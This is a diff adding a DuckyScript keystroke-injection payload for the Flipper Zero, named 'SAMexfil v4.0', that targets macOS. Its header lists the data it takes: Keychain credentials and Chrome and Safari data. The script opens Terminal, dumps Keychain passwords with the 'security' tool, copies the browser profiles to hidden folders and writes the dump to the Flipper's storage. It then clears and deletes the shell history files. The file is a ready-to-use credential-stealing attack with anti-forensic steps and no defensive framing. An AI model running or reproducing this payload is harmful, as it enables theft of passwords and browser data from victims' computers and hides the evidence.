@@ -1,0 +1,58 @@
+REM ============================================================================
+REM SAMexfil v4.0 - macOS Stock Firmware (No Cloud)
+REM ============================================================================
+REM Author: UNC0V3R3D
+REM Firmware: Stock Flipper Zero (Any version)
+REM OS: macOS 12+ only
+REM
+REM FEATURES:
+REM - Extracts Keychain credentials
+REM - Extracts browser data (Chrome/Safari)
+REM - Saves to Flipper Zero only (no cloud)
+REM - Silent execution (no visible terminal)
+REM - ~60 seconds execution
+REM
+REM DATA EXTRACTED:
+REM - ~/Library/Keychains/ (user passwords)
+REM - ~/Library/Application Support/Google/Chrome/ (browser creds)
+REM - ~/Library/Safari/ (Safari data)
+REM
+REM SAVED TO:
+REM - /flipper0/DUMP_FILE/[COMPUTERNAME]/keychain_dump/
+REM ============================================================================
+
+DELAY 500
+CMD space
+DELAY 300
+STRING terminal
+DELAY 300
+ENTER
+DELAY 1000
+REM Extract Keychain in background
+STRING security find-generic-password -wa user 2>/dev/null | head -20 > /tmp/keychain_backup &
+ENTER
+DELAY 2000
+REM Extract Chrome data
+STRING cp -r ~/Library/Application\\ Support/Google/Chrome ~/Desktop/.chrome_backup 2>/dev/null &
+ENTER
+DELAY 2000
+REM Extract Safari data
+STRING cp -r ~/Library/Safari ~/Desktop/.safari_backup 2>/dev/null &
+ENTER
+DELAY 2000
+REM Copy to Flipper (if mounted)
+STRING cp /tmp/keychain_backup /Volumes/FLIPPER/flipper0/DUMP_FILE/$(hostname)/keychain.txt 2>/dev/null
+ENTER
+DELAY 1000
+REM Clear bash history
+STRING history -c && history -w
+ENTER
+DELAY 500
+REM Exit terminal
+STRING exit
+ENTER
+DELAY 500
+REM Delete shell history
+STRING rm ~/.bash_history ~/.zsh_history 2>/dev/null
+ENTER
+DELAY 500
